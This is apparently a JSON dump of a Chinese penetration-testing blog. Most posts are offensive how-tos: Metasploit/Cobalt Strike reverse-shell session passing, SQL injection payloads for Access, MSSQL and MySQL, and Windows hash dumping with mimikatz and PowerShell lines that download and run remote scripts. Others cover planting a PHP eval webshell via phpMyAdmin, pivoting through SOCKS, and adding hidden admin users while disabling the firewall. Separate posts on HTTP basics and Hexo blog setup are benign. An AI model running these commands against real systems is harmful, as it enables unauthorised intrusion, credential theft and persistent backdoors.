{"pages":[],"posts":[{"title":"","text":"MSF与CS两者之间的联动 将CS的上线机器会话传给MSF. 在msf中启动一个监听 12345use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost #设置监听的地址set lport #设置监听的端口run 在CS客户端创建一个外部监听器，创建的payload是windows/foregin/reverse_tcp(!注意，这里的协议要和MSF监听使用的payload的协议一定要相同)，ip为MSF的ip地址，端口为MSF监听的端口. 在客户端界面选中需要转发会话的上线计算机，右键选择Spawn:选择刚才创建的监听器,此时可以看到MSF产生了会话. 将MSF的会话传给CS 在CS的客户端创建一个beacon监听，payload选择windows/beacon_http/reverse_http(https的也行.)，ip为CS的ip，设置完监听的端口后会保存，此时会弹出一个输入ip地址的信息，根据提示信息以及需求输入地址即可。点击OK后监听开始。 通过MSF将一个新的payload注入到当前的session中，这个payload设置的lhost，与lport设置为CS的监听地址和端口.123456meterpreter &gt; backgroup #将会话保存到后台use exploit/windows/local/payload_inject #使用注入的expset lhost #设置CS的监听ipset lport #设置CS的监听端口set session id #设置保存在后台的会话id,如果不知道可先使用‘sessions’这个命令查看后台的会话和相应的idrun #运行 此时CS客户端会出现被攻击的电脑上线了.","link":"/2019/08/28/MSF与CS两者之间的联动/"},{"title":"","text":"Access数据库注入笔记Access数据库是微软发布的关系型数据库管理系统，是Microsoft Office的系统程序之一，access的数据库结构是：表名—&gt;列名—&gt;内容字段，一个库若干张表。 Access注入的基本流程 判断是否存在注入 一般是在参数后面加特殊符号如单引号，反斜杠，双引号或者and 1=1,and 1=2等导致数据报错来判断。 判断数据的类型 从上面的报错信息可以判断是否为Access数据库，若报错字段中有Microsoft JET Database Engine的字样，则说明这个网站使用的数据库是Access数据库。 通过构造sql语句判断如12http://www.xxx.com?id=1 and (select count(*) from sysobjects)&gt;0http://www.xxx.com?id=1 and (select count(*) from msysobjects)&gt;0 如果sysobjects的sql语句后返回的页面显示正常，msysobjects的sql语句返回的页面不正常则说明网站数据库使用的是sql server的数据库如果sysobjects和msysobjects的sql语句返回的页面都不正常，或者msysobjects的sql语句返回的页面显示正常，则说明数据库使用的是Access数据库。还可以通过判断是否支持len函数和chr函数，且不支持length和char函数来判断是Access数据库。 查询字段数 使用order by 猜测字段数，方法和其他数据库猜测字段数一样。 猜测表名 如果有系统表则可直接注入UNION SELECT Name, NULL, NULL, NULL, NULL from MSysObjects WHERE Type=1 由于Access数据库的系统表一般不可访问，所以数据库的表名只能通过猜测来获取，常见的管理表有：admin,login,admin_user等。1id=1 and exists(select * from admin)页面返回正常则admin表存在。 猜测列名 在知道表名的情况下使用如下查询1id=1 and exists(select 列名 from 表名)页面返回正常则列名存在。 猜解内容 确定内容的行数id=1 and IIF((select count(*) from 表名)=X，1，0）X为大于0的任意数 确定内容的长度id=1 and (select top 1 len(列名） from 表名)&gt;N,top表示把最这个列的第一条数据取出来，N表示猜测的列名长度。可用二分法来减少猜测次数。 判断内容id=1 and (select top 1 asc(mid(列名，1，1)） from 表名)=97判断这个列的第一个数据的第一位，97为‘a’的ascii码的值，以此来逐个猜解。 Access的偏移注入 适用于偏移注入的条件 主查询语句的字段数大于目标表列的字段数。 知道目标表的任意字段。 注入的原理偏移注入使用的是union联合查询来判断的，union联合查询需要列的数目相等。构造语句为：select * from (admin as a inner join admin as b on a.id=b.id)*代表查询的字段，（admin as a inner join admin as b on a.id=b.id)表示将admin表记为a,同时也为b,然后查询条件是a表的id列与b表的id列相等，返回所有相等的行，a,b属于同一个表，所以会全部返回。如：1http://XXXX.asp?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from admin 假设有五个表列则1http://XXXX.asp?id=1 union select 1,2,3,4,5,6,* from (admin as a inner join admin as b on a.id=b.id) 如果没有爆破出可多设这个表123http://XXXX.asp?id=1 union select 1,2,3,4,5,6,a.id,* from (admin as a inner join admin as b on a.id=b.id)http://XXXX.asp?id=1 union select 1,2,3,4,5,6,a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id) 这里*的字段排列顺序被打乱了，可以增加显示位的机率。 还有很多好的思路可以参考文章：https://www.t00ls.net/articles-38412.html?page=2","link":"/2019/08/17/Access数据库注入笔记/"},{"title":"","text":"MSSQL注入笔记 在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了.数据库的信息收集语句 判断数据是否为mssql：and exists(select * from sysobjects) 获取当前的数据库名称：and 1=convert(int,(db_name())) 获取数据版本信息：and 1=convert(int,(@@version()) 获取全部数据库：and 1=convert(int,(select quotename(name) from master..sysdatabases FOR XML PATH('')))或者and 1=convert(int,(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))) 用户信息收集语句 查看是否为db_owner权限：and 1=(select IS_SRVROLEMEMBER('db_owner')) 查看当前用户是否为数据库管理员：and 1=CONVERT(int,(select is_srvrolemember('sysadmin'))) 查看连接数据库的用户：and 1=convert(int,(user)) 获取当前数据库用户名：and 1=convert(int,(select suser_sname())) 获取表名 获取当前库的第一张表名：and 1=convert(int,(select top 1 table_name from information_schema.tables )) 将表名存入table not in的元祖中继续查询多余的表，直到报错：and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in('查出的表名1','表名2'...))) 获取列名 获取表名下的列名：and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='表名' )) 将所有列名存入column_name not in的元祖中，继续查询列名直到报错：and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='表名' and column_name not in('列名1','列名2'，...))) 获取数据 直接查询相应列字段下的第一条数据：and 1=convert(int,(select top 1 列名 from 表名 )) 参考http://www.admintony.com/MSSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.htmlhttps://klionsec.github.io/2016/05/16/mssql-error-injection/","link":"/2019/08/17/MSSQL注入笔记/"},{"title":"","text":"Windows下抓取hash的几种方法 在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM Hash和LM Hash(从windows vista和2008开始，微软就取消了LMHash),这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS.dit数据库中，当用户登陆时，这些Hash也可能存储在内存中，可被抓取到。SAM全称叫做安全帐户管理器，是windows xp,windows vista,win7,win8.1和win10中存储用户密码的数据库文件。提取SAM数据库的Hash 使用reg命令保存注册表键 12reg save hklm\\sam c:\\sam.hive reg save hklm\\system c:\\system.hive 使用powershell脚本及Invoke-NinjaCopy.ps1或者Invoke-mimikatz.ps1 使用powershel在本地加载脚本Invoke-NinjaCopy.ps1命令: 1powershell -exec bypass \"Import-Module .\\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination .\\sam.hive\" 使用在线加载Invoke-NinjaCopy.ps1的方式： 1powershell -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('http://ip/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path 使用powershel在本地加载脚本Invoke-Mimikatz.ps1命令: 1powershell -exec bypass \"import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds\" 使用在线加载Invoke-Mimikatz.ps1的方式： 1powershell -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('http://ip/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Dumpcreds\" 使用mimikatz 查看是否有权限:privilege::debug 读取密码:sekurlsa::logonPasswords QuarkPwDump 直接导出密码:QuarkPwDump.exe -dhl 使用上述工具和脚本时，大多数都会被防火墙或者杀软给防御掉一般使用在线加载脚本的方式导出密码文件。","link":"/2019/08/17/Windows下抓取hash的几种方法/"},{"title":"","text":"HTTP协议基础基本概念 HTTP协议简称超文本传输协议，用于服务器传输超文本到本地浏览器的传送协议 HTTP协议的特点 支持b/s以及c/s模式 简单快速: 客户向服务器请求服务时，只需传送请求方法和路径。 灵活: HTTP允许传输任意类型的数据对象。 无连接: 无连接的含义是限制每次连接只处理一个请求，服务器处理完客户请求，并收到客户的答应后即断开连接，采用这种方式可以节省传输时间。 无状态: HTTP协议是无状态协议，无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它重新连接，这样可能导致每次连接传送的数据量增加。 URL 定义: 统一资源定位符，是互联网用来标志某一处资源的地址 URL的解读:如网址–http://www.helloworld.com:8080/news/index.php?id=1#name 协议部分为: http:// 域名部分为: www.helloword.com 端口部分为: 8080 虚拟目录部分为: news 文件名部分为: index.php 参数部分为: id=1 锚部分为: name 请求的方法 GET: 请求指定的页面资源，并返回实体主体。 HEAD: 类似get请求，但返回的相应中没有具体的内容，用于获取报文头。 POST: 向指定资源提交数据进行处理请求，数据被包含在请求主体中。 PUT: 从客户端向服务器端传送的数据取代指定的文档的内容。 DELETE: 请求服务器删除指定页面。 CONNECT: http/1.1协议中预留给能够将连接改为管道方式的代理服务器。 OPTIONS: 允许客户端查看服务端的性能。 TRACE: 回复服务器收到的请求，主要用于测试诊断。 Request / Respongse内容信息 请求报文由三部分组成:请求行，消息报头，请求正文。 请求行的内容为请求的方法，请求的URL，HTTP协议版本 请求报文头内容一般含有以下内容 Accept: 显示可以接受的数据类型。 Referer: 请求的来源地址。 Accept-Language: 可接受的文本语言。 User-Agent: 内核，系统，浏览器等信息。 Content-Type: 请求的媒体类型信息也叫MIME。 Host: 请求的主机地址。 Content-Length: 内容的长度 Connection: 对于长链接处理的方式 Cache-Control: 对于缓存的处理 Cookie: 身份认证信息 请求体的内容一般为POST传输的参数值，GET的参数值在请求行中的URL中传输。 响应报文也由三部分组成:状态行，消息报头，响应正文 状态行格式一般为 HTTP-Version Status-Code Reason-Phrase CRLF 其中，HTTP-Version表示服务器HTTP协议的版本；Status-Code表示服务器发 的响应状态代码；Reason-Phrase表示状态代码的文本描述。 状态代码有三位数字组成，第一个数字定义了响应的类别，且有五种可能取值： 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求 常见状态代码、状态描述、说明： 200 OK //客户端请求成功 400 Bad Request //客户端请求有语法错误，不能被服务器所理解 401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报域一起使用 403 Forbidden //服务器收到请求，但是拒绝提供服务 404 Not Found //请求资源不存在，eg：输入了错误的URL 500 Internal Server Error //服务器发生不可预期的错误 503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 响应报头 location:响应报头域用于重定向接受者到一个新的位置，location常用于在更换域名的时候， server: 包含服务器用来处理请求的软件信息。 响应实体 Content-Encoding: 实体报头域被用作媒体类型的修饰符。 Content-Language: 实体报头域描述了资源所用的语言。 Content-Length: 实体正文的长度。 Content-Type: 实体报头域发送给接受者的实体正文媒体类型。 Set-Cookie: 服务端设置客户端的Cookie值","link":"/2019/08/04/HTTP协议基础/"},{"title":"","text":"Mysql注入笔记(二) 注入产生的原理 将用户数据当做信任的数据，没有过滤。 过滤的规则不严格，数据库配置不恰当。 注入的类型 按请求方式: GET型，POST型。 按参数类型：整形，字符型。 按反馈类型：UNION型，显错型，布尔型，时间型，搜索型等。 insert 注入，update注入，delete注入，二次注入，宽字节注入等。 数据库信息的收集当判断有注入时，对数据的信息简单收集有助于后续的注入，在显示位输入相关的函数即可。 常用的数据库信息搜集的函数以及方法 判断数据库的版本号:version(),@@version，/!版本号/意为在该数据库版本之上执行，如查询用户名/!40000 user()/ 数据库类型: database() 路径收集:@@datadir 操作系统:@@version_compile_os 用户名的收集:系统用户名-&gt;system_user(),用户名-&gt;user(),当前用户名-&gt;current_user(),链接数据库-&gt;session_user() 读取host与user1234567891011mysql&gt; select * from users where id =1 union select 1,host,user from mysql.user;+----+-----------+----------+| id | username | password |+----+-----------+----------+| 1 | Dumb | Dumb || 1 | % | root || 1 | 127.0.0.1 | root || 1 | ::1 | root || 1 | localhost | root |+----+-----------+----------+5 rows in set (0.00 sec)","link":"/2019/08/04/sql注入_mysql_2/"},{"title":"","text":"Mysql注入笔记（一） SQL的基本语法(增删改查) 创建数据库 12mysql&gt; create database test;Query OK, 1 row affected (0.00 sec) 查询所有数据库 12345678910mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || test || performance_schema |+--------------------+4 rows in set (0.00 sec) 使用数据库新建表 1234mysql&gt; use testDatabase changedmysql&gt; create table admin (id int,username varchar(255),password varchar(255));Query OK, 0 rows affected (0.09 sec) 查看数据库，插入数据与查询 123456789101112131415161718mysql&gt; show tables;+---------------------+| Tables_in_test |+---------------------+| admin |+---------------------+1 row in set (0.00 sec)mysql&gt; insert into admin (id,username,password) values (1,\"admin\",\"admin\");Query OK, 1 row affected (0.00 sec)mysql&gt; select * from admin;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin |+------+----------+----------+1 row in set (0.00 sec) where语句查询 1234567mysql&gt; select * from admin where id =1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin |+------+----------+----------+1 row in set (0.00 sec) 修改数据 1234567891011mysql&gt; update admin set username='test' where id=1;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; select * from admin;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | test | admin |+------+----------+----------+1 row in set (0.00 sec) 删除数据 12345mysql&gt; delete from admin where username='test';Query OK, 1 row affected (0.01 sec)mysql&gt; select * from admin;Empty set (0.00 sec) Information_schema库这个库在mysql版本5以上才有，这个 库存储了所有库的库名，表名，列名等信息。 经常引用的数据库表 SCHEMATA表：当前mysql中所有的数据库的信息。 TABLES表：提供数据库中的表的信息。 COLUMNS表：提供了所有表的列的信息。 特殊符号特殊符号在bypass各种防护时使用的最多 常用的特殊符号 12345678''\"\"(){}\\\\\\``% 注释符号 123456# /**/ /*/**/等效于/**/-- + 用这个符号注意是--空格任意字符;%00`/*!*/ 内列注释也可以当作一个空格 /*!/*!*/是等效于/*!*/的 操作符与逻辑操作符(排在同一行的具有相同的优先级) 123456789101112131415:=||, OR, XOR&amp;&amp;, ANDNOTBETWEEN, CASE, WHEN, THEN, ELSE=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN|&amp;&lt;&lt;, &gt;&gt;-, +*, /, DIV, %, MOD^- (一元减号), ~ (一元比特反转)!BINARY, COLLATE","link":"/2019/08/04/sql注入_mysql_1/"},{"title":"","text":"Mysql注入笔记(四) 报错注入在不能使用union联合注入时，需要使用报错注入，使用特殊的函数来报错。12345678910111213141516171819202122232425262728291.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); 使用函数报错需要直到函数的使用方法和报错的原理，以floor()函数为例。1select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 从里向外解读floor(rand(0)2)-&gt;rand()返回一个0到1的浮点数，若指定一个整数的参数N，则它被用作种子值，用来产生随机数，floor(x)返回不大于x的最大整数值。a与x为别名，在查询时建立临时的列或内容，如(xxx)a,a的列的内容为xxx。在使用floor报错时不能使用group_concat函数查询数据，只能使用limt逐个取值。使用conca()函数解读，如concat(user(),x)函数将user(),x拼接，得到字符串-&gt;user()0或user()1，此时查询时会判断虚拟表中有没有user()0如果没有则进行floor(rand(0)2)的第二次运算，第一次运算判断虚拟表中存不存在以有的数据段，如果有则count(*)增加1，如果没有则进行第二次运算并将数据插入虚拟表中，group by后为虚拟表中的主键，报错的关键是主键的改变(在mysql 数据库中主键是唯一的不能出现多个主键)。 其他函数可通过查阅php手册，mysql手册来解读。在使用报错注入中经常会遇到报错的字段长度或转码的长度限制于32位，可使用substr()函数截取分割123456789substr(string string,num start,num length);string为字符串start为起始位置length为长度127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- + 参考链接:404大佬的mysql注入文档:https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKIfloor函数解读:https://blog.csdn.net/he_and/article/details/80455884","link":"/2019/08/04/sql注入_mysql_4/"},{"title":"","text":"Mysql注入笔记(六) 宽字节注入在使用php连接mysql时，当set character_set_client=gbk时会导致一个编码转换注入的问题，宽字节注入的原理就是当后端使用了addslashes()，get_magic_quotes_gpc进行过滤时，会在单引号前加入转义字符 \\ 则会变成 \\’，此时我们将提交如12http:// xxx/unicodeSqlTest?id=1%df%27此时的转换过程为：1%df%27-&gt;(addslashes过滤)-&gt;1%df%5c%27-&gt;GBK转码-&gt;1運' 因数据库无法识别 ‘運’ ，此时单引号逃逸出来了，从而造成注入漏洞。 二次注入二次注入的原理是，当插入被addslashes(),get_magic_quotes_gpc()，rawurlencode(),rawurldecode(),urlencode(),urldecode()等等转义，但是写入数据库还是使用的原来的数据，二次注入由此造成注入的原理图为(网上图)假设提交数据id=1%2527,在第一次webserver会自动解码，将%25解码成%,则参数为id=1%27,第二次程序使用了urldecode或者rawurldecode函数来解码id参数，则解码后的结果为id=1’ 总结宽字节注入是因为利用了编码转换或者是iconv()函数的转码造成的，防御方式可使用mysql_set_charaset(gbk)指定字符集，再使用mysql_real_escape_string进行转义。二次注入是利用了多次转码来绕过过滤，防御方式为禁止输入的数据库的变量存在非法字符，在数据库输出输出时也使用过滤处理","link":"/2019/08/10/sql注入_mysql_6/"},{"title":"","text":"使用msf的socks4a模块进入内网 当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。 首先查看内网网段123456meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 10.0.110.0/255.255.255.0Local subnet: 132.21.21.0/255.255.255.0 发现存在内网10.0.110.0的内网网段， 将内网的网段添加到路由表并查看路由表是否添加好，路由表不使用了记得删除即可。 123run autoroute -s 10.0.110.0/24 #添加路由表run autoroute -p #查看路由表是否添加run autoroute -d -s 10.0.110.0/24 #删除路由表 使用扫描模块可以对内网主机扫描，查看主机数量 1run post/windows/gather/arp_scanner rhosts=10.0.110.0/24 保存会话，使用socks4a代理模块对内网主机进行渗透 12345meterpreter &gt; background #保存会话msf5 &gt; use auxiliary/server/socks4a #使用socks4a代理模块msf5 auxiliary(socks4a)&gt; set srvhost 127.0.0.1 #设置本地为监听地址msf5 auxiliary(socks4a)&gt; set srvport 1080 #设置监听端口msf5 auxiliary(socks4a)&gt; run #运行，代理设置完成 设置proxychains的配置文件proxychains.conf 123vi /etc/proxychains.conf[ProxyList]socks4 127.0.0.1 1080 #添加代理 此时可以使用proxychains代理其他软件用于渗透了。 注意！使用socks4a代理时，socks代理不了底层协议，这是socks协议本身的原因，只能在tcp这一层以及往上一层，底层协议如icmp和arp这种就不怎么适用了，所以使用相关软件时因注意发包使用的协议。","link":"/2019/08/28/使用msf的socks4a模块进入内网/"},{"title":"","text":"通过phpmyadmin获取webshell 在渗透过程中，如果通过爆破进入了phpmyadmin的后台，那么可以通过几种方法在phpmyadmin后台获取webshell，前提是得直到网站的绝对路径(信息收集的重要性)。 直接在插入一句话在phpmyadmin后台的sql栏下可以执行sql语句，首先查看into outfile是否能用执行以下语句查看:1show global variables like '%secure%' 如果secure_file_priv=null表示不允许导入导出；如果secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹。如果secure_file_priv没有设置时，表示没有任何限制，此时可以直接插入一句话在网站的根路径下：1select '&lt;?php eval($_POST[1]);?&gt;' INTO OUTFILE '网站的绝对路径/1.php'。 此时可直接菜刀连接。 通过日志或webshell首先查看general log的日志保存状态是否为开启，一般为OFF(关闭)或者ON(打开)，general log file指的是日志的保存路径，攻击思路是将日志记录功能打开后，再更改保存日志文件的的默认路径为网站根路径下的一句话木马文件，即可获取webshell。 在phpmyadmin后台下的sql栏执行sql语句：1show variables like '%general%' 此时可看到general_log的状态和general_log_file的路径。 更改general_log的状态和general_log_file的路径：12set global general_log='ON';set global general_log_file='网站根路径/1.php'； 执行完后，在网站根路径会生成1.php的伪日志文件，再用查询语句写入一句话到日志文件中1select '&lt;?php eval($_POST[1]);?&gt;'; 现在可以直接菜刀连接webshell了。 php获取物理路的几种方法 通过sql查询 在sql查询框中输入select @@basedir就可以看到数据库的绝对路径，以此来猜测网站的根路径。 通过报错 通过在参数后面加单引号或者错误的参数来导致报错，从返回的报错信息获取物理路径。 Google语法 使用site语法结合关键字段搜索相关网页，有些出错的网页快照会暴露物理物理路径，常见的关键字有warning和fatal error。如果目标站点是二级域名，site接的是其对应的顶级域名，这样获取的信息多。 通过测试文件 网站的测试文件一般都会存在根目录，比如phpinfo()等，可通过工具扫描来加快探测的速度和效率。常用的测试文件后缀名以及测试文件有123456www.xxx.com/test.phpwww.xxx.com/ceshi.phpwww.xxx.com/info.phpwww.xxx.com/phpinfo.phpwww.xxx.com/php_info.phpwww.xxx.com/1.php 通过phpmyadmin获取路径 找到phpmyadmin的管理页面后，可探测一些特定的文件来获取物理路劲。一般使用工具探测。如wwwscan等。12345678/phpmyadmin/libraries/lect_lang.lib.php/phpMyAdmin/index.php?lang[]=1/phpMyAdmin/phpinfo.phpload_file()/phpmyadmin/themes/darkblue_orange/layout.inc.php/phpmyadmin/libraries/select_lang.lib.php/phpmyadmin/libraries/lect_lang.lib.php/phpmyadmin/libraries/mcrypt.lib.php 通过配合文件获取路径配置文件中往往需要写入物理路径，在有文件读取漏洞时，可以使用工具读取配置文件或者手工使用load_file()读取文件。以下为常见在不同系统下的配置文件 123456789101112Windows:c:\\windows\\php.ini php配置文件c:\\windows\\system32\\inetsrv\\MetaBase.xml IIS虚拟主机配置文件Linux:/etc/php.ini php配置文件/etc/httpd/conf.d/php.conf/etc/httpd/conf/httpd.conf Apache配置文件/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件/etc/nginx/conf.d/vhost.conf /usr/local/etc/nginx/nginx.conf Nginx配置 总结：在实际写入过程中并不会有多顺利，需要根据实际情况来解决一些难题，利用漏洞组合来进行webshell的获取是一种非常好的办法，思路需要学习和总结，并通过实践去获取新的思路。参考学习链接：https://zhuanlan.zhihu.com/p/55466863https://xz.aliyun.com/t/3283","link":"/2019/08/17/通过phpmyadmin获取webshell/"},{"title":"Linux下完成hexo+github pages搭建个人博客","text":"安装nodejs1$ apt-get install gcc g++ make -y &amp;&amp; wget https://nodejs.org/dist/v8.1.2/node-v8.1.2.tar.gz &amp;&amp; tar zxf node-v8.1.2.tar.gz &amp;&amp; cd node-v8.1.2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install 安装npm1$ sudo apt-get install npm 安装git1$ sudo apt-get install git 注册github账号注册github 在个人设置中创建存储库（Your repositories) Ower: username(登陆github的用户名) / repository name:username.github.io 在终端生成ssh key 在当前用户目录创建.ssh文件夹 1$ mkdir ~/.ssh 打开./ssh 1$ cd ~/.ssh 设置密码 1$ ssh-keygen -t rsa 按下回车后在~/.ssh文件夹下生成两个ssh key(id_rsa,id_rsa.pub) 生成公钥作为本机ssh连接github的口令 如报错为：Could not open a connection to your authentication agent。执行下列命令可解决： 1$ ssh-agent bash 进入github个人设置页面，点击SSH AND GPGKEYS添加一个SSH KEY标题自拟，KEY的内容为在终端输入下面命令，复制密钥（注意复制内容包括头部ssh-rsa与尾部的xxx@xxx）添加完成。 1$ cat ~/.ssh/id_rsa.pub 配置git,username和email是github上的用户名和注册用的邮箱12$ git config --global user.name \"username\"$ git config --global user.email \"email\" 测试是否能ssh连接1$ ssh -T git@github.com 若报错消息为： The authenticity of host ‘github.com (xxx.xxx.xxx.xxx)’ can’t be established.RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.Are you sure you want to continue connecting (yes/no)?时不能按回车，选择yes即可，在执行上面代码尝试连接，若信息为：You’re successfully authenticated,but github does not provide shell access.则为成功连接。 搭建本地Hexo 安装hexo 1$ sudo npm install hexo-cli -g 创建blog网站 12345$ hexo init blog$ cd blog$ npm install$ hexo server$ npm instsall hexo-deployer-git -save 配置网站的deploy 打开网站配置文件_config.yml 1$ cd _config.yml 1234$ type:git $ type:git $ repo:（在github中打开建立的项目复制ssh形式的地址） $ branch:（默认为master） 测试123$ hexo clean$ hexo g$ hexo s 打开浏览器输入localhost:4000查看效果 部署到github1$ hexo d 搭建完成。参考链接：https://blog.csdn.net/ctsas/article/details/73694849","link":"/2019/08/04/my_first/"},{"title":"","text":"渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL 创建文件内容: echo xxxx &gt; x.txt 查看文件内容: type xxx.txt 创建目录: md 目录名 删除文件夹: rd 文件夹名 删除文件: del 文件名 复制文件: copy 文件名 移动文件或文件夹: move 文件(夹)名 路径 以树形列出文件夹结构: tree 文件夹名 查看以启动的服务: net start 开启或停止某个服务: net start(stop) 服务名 查看端口占用进程情况: netstat -ano 查看本机用户信息: net user 查看用户组信息: net localgroup 创建用户username: net user username/add 创建隐藏用户username: net user username$/add 将用户username添加到管理用户组: `net localgroup administrators username/add 更改用户username密码: net user username 更改的密码 删除用户username: net user username/delete 激活(禁用)用户username: net user username/active:yes(no) 开启3389: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f或者wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 关闭防火墙: netsh firewall set opmode mode=disable或者netsh advfirewall set allprofiles state off 渗透linux常见命令 显示主机信息: uname -a 查看主机名: hostname 查看ip信息: ipconfig 查看当前路径: pwd 查看当前目录文件: ls 查看目录文件详细信息ls -l 创建目录: mkdir 目录名 创建新文件: touch 文件名 为文件创建软连接: ln -s 源文件或者目录 链接文件或者目录 复制文件或者目录: cp 源文件或目录 目标文件或目录 删除文件或目录: rm -f强制删除不提醒，rm -r递归删除整个目录树,rm -i删除文件或目录提醒。 移动文件: mv 源文件或目录 查找文件: find -name 文件名 查看文件内容: cat+文件名 分页显示文件内容: more+文件名 查看文件属性: file+文件名 gzip压缩打包以及解压:gizp -9+文件，最大压缩比压缩。保留源文件压缩gzip -c 文件名 &gt; 文件名.gz解压gzip -dv+文件名.gz，保留源文件解压gzip -cd 文件名.gz &gt; 压缩文件存放的目录地址 bzip2压缩打包: bzip2+文件名。保留源文件压缩bzip2 -k+文件名.解压bzip2 -dv+文件名.bzip2 .保留源文件解压: bzip2 -kd+文件名.bzip2 tar压缩解压: 以gzip格式压缩tar -zcvf newfile.tar.gz 源文件 gzip格式解压 tar -zxvf 压缩包名 -C 解压的文件放置的目录 以bzip2格式压缩 tar -jcvf newfile.tar.bzip2 源文件 以bzip2格式解压 tar -jxvf 压缩包名 -C 解压的文件放置的目录 查看压缩包中的内容tar -tvf 压缩包名 改变文件权限: chmod (r-&gt;4 w-&gt;2 x-&gt;1)777 文件名或者按user(所有者)-&gt;u，group(组)-&gt;u，others(其他人)-&gt;u,三套属性a.r-&gt;(可读),w-&gt;(可写),x-&gt;(可执行)赋予权限，如chmod u+r test.c-&gt;赋予test.c所有者可读权限.chmod a+w test.c-&gt;赋予test.c所有者，组，以及其他人可写权限。 更改文件/目录所属的拥有者和组: chown 拥有者名:组名 文件或目录名 只修改所属组: chogrp -R 组名 文件或目录名 添加用户: adduser 用户名 修改密码 passwd 用户名删除用户 userdel 用户名 查看目前登陆身份: whoami 查看目前登陆的用户和组: id 显示磁盘可读的情况: df -h 显示最后登陆的用户: last 查看进程: ps -aux 进程的动态情况 top 终止进程: kill -9 PID 显示进程ID的网络接口: netstat -tulpn 启动ip转发: echo '1' &gt; /proc/sys/net/ipv4/ip_forward","link":"/2019/08/04/windows与linux命令/"},{"title":"","text":"Mysql注入笔记(三) 从一个简单的get注入学习注入流程。以Sqli-labs第一关演示1.单双引号判断是否有报错： 1127.0.0.1/sql-lab/Less-1/?id=1%27 报错信息：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 从报错信息判断出单引号没有闭合，所以造成错误，同时得知后面有limit 0,1的数据库取值方式，可通过闭合单引号后注释来绕过。1127.0.0.1/sqli/Less-1/?id=2' -- + 查询字段数使用order by+判断的字段数,使用二分法来减少判断数。 查询数据库名 1127.0.0.1/sqli/Less-1/?id=-2' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- + 通过limit0,1 来控制前端的显示位的数据(从第0条取一条)，所以上面的语句是从第三条取一条，如果过滤了逗号，可用分页的方式取值，如1 offset 